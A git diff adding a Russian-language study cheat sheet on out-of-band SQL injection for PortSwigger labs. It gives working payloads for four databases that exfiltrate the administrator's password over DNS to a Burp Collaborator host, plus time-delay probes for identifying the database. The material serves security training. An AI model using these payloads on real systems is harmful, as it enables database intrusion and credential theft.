@@ -322,9 +322,66 @@ Payload set 2: символы<br>
 Запросы с задержкой > 9000 мс — это правильные пары (позиция, символ).<br>
 Запросы с быстрым ответом (< 1000 мс) — не подходят.** <br>
 
+# OAST (Out‑of‑Band) SQL Injection — шпаргалка
+## 📌 Когда использовать OAST
+Используй OAST, если:<br>
+❌ Нет ошибок (Error‑based не работает)<br>
+❌ Нет изменений на странице (Boolean‑based не работает)<br>
+❌ Нет задержек (Time‑based не работает, либо запросы выполняются асинхронно)<br>
+**Суть: ты заставляешь сервер БД отправить внешний запрос (DNS/HTTP) на твой контролируемый сервер (Collaborator). Если запрос доходит — уязвимость подтверждена, и можно извлекать данные.**
 
+## 🧰 Необходимые инструменты
+Burp Collaborator (встроен в Professional, но в пробной версии работает) — предпочтительный вариант для лабораторий PortSwigger.<br>
+Альтернативы: Interactsh (бесплатно), oastify.com, но в лабораториях PortSwigger они не работают из‑за блокировки внешних систем.<br>
+В лабораториях PortSwigger используй только Burp Collaborator (публичный сервер по умолчанию).<br>
 
+## 🔍 Шаг 1. Проверка, что OAST работает (безусловный запрос)
+#### MSSQL
+'; exec master..xp_dirtree '//твой_поддомен.burpcollaborator.net/a'--<br>
+#### Oracle
+'||UTL_INADDR.GET_HOST_ADDRESS('твой_поддомен.burpcollaborator.net')||'<br>
+#### PostgreSQL
+'||dblink('host=твой_поддомен.burpcollaborator.net user=test dbname=test', 'SELECT 1')||'<br>
+#### MySQL
+' AND LOAD_FILE(CONCAT('\\\\', 'твой_поддомен.burpcollaborator.net', '\\a'))--<br>
+**Если в Collaborator видишь DNS/HTTP-запрос → OAST работает.**
 
+## Шаг 2. Извлечение данных (эксфильтрация)
+#### MSSQL (экфильтрация пароля через DNS)
+'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='administrator'); exec('master..xp_dirtree "//'+@p+'.твой_поддомен.burpcollaborator.net/a"')--<br>
+#### Oracle (через UTL_INADDR)
+'||UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator')||'.твой_поддомен.burpcollaborator.net')||'<br>
+#### Oracle (через XML + EXTRACTVALUE)
+x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.твой_поддомен.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--<br>
+#### PostgreSQL (через dblink)
+'||dblink('host='||(SELECT password FROM users WHERE username='administrator')||'.твой_поддомен.burpcollaborator.net', 'SELECT 1')||'<br>
+#### MySQL (через LOAD_FILE)
+' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='administrator'), '.твой_поддомен.burpcollaborator.net', '\\a'))--<br>
+
+## 📋 Как понять, какая СУБД
+Если ты не знаешь СУБД, проверь через задержки:
+
+| СУБД       | Команда для задержки (10 секунд)          | Примечание                                |
+|------------|-------------------------------------------|-------------------------------------------|
+| **MSSQL**  | `WAITFOR DELAY '0:0:10'`                  | Формат: `'HH:MI:SS'`                      |
+| **Oracle** | `DBMS_PIPE.RECEIVE_MESSAGE('x', 10)`      | Параметр — секунды                        |
+| **PostgreSQL** | `pg_sleep(10)`                         | Аргумент — секунды                        |
+| **MySQL**  | `SLEEP(10)`                               | Аргумент — секунды                        |
+
+### 💡 Важные нюансы
+В лабораториях PortSwigger используй только Collaborator-адрес, сгенерированный через Copy to clipboard в Burp. Сторонние сервисы (Interactsh, oastify.com) блокируются.<br>
+
+Если лаборатория не срабатывает, но Collaborator получает запросы — иногда система засчитывает решение автоматически, даже если ты не видишь данные в Collaborator (проверь статус лаборатории).<br>
+
+Для эксфильтрации данных убедись, что ты используешь правильные имена таблиц и столбцов (в лабораториях обычно users, username, password).<br>
+
+### Полезные ссылки<br>
+PortSwigger SQL Injection Cheat Sheet — раздел с OAST-методами.<br>
+
+Шпаргалка по OAST для разных СУБД — репозиторий с пейлоадами.<br>
+
+### 📌 Запомни
+**OAST — это последний рубеж, когда всё остальное не работает. Если ты умеешь отправлять DNS-запросы через SQL, ты можешь обойти почти любую защиту.**
 
 
 
